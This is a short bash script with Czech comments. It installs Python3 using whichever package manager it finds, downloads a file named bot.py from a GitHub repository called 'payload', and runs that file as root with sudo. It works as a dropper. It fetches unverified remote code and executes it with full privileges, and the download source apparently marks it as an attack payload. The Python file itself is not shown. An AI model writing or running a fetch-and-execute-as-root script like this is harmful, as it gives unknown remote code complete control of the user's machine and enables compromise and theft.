#!/usr/bin/env bash
set -e

# URL ke skriptu
SCRIPT_URL="https://raw.githubusercontent.com/maearapowre-cmd/payload/main/bot.py"
SCRIPT_NAME="bot.py"

echo "==> Kontrola Pythonu…"

# funkce pro instalaci pythonu
install_python() {
    echo "==> Pokus o instalaci Python3…"

    if command -v apt >/dev/null 2>&1; then
        sudo apt update && sudo apt install -y python3 python3-pip
    elif command -v yum >/dev/null 2>&1; then
        sudo yum install -y python3 python3-pip
    elif command -v dnf >/dev/null 2>&1; then
        sudo dnf install -y python3 python3-pip
    elif command -v pacman >/dev/null 2>&1; then
        sudo pacman -Sy --noconfirm python python-pip
    elif command -v zypper >/dev/null 2>&1; then
        sudo zypper install -y python3 python3-pip
    elif command -v apk >/dev/null 2>&1; then
        sudo apk add python3 py3-pip
    else
        echo "❌ Nenalezen podporovaný package manager."
        exit 1
    fi
}

# pokud python3 není, nainstaluj
if ! command -v python3 >/dev/null 2>&1; then
    install_python
else
    echo "✅ Python3 již nainstalován."
fi

echo "==> Stahování skriptu…"
curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_NAME"

echo "==> Spouštím Python skript…"
sudo python3 "$SCRIPT_NAME"
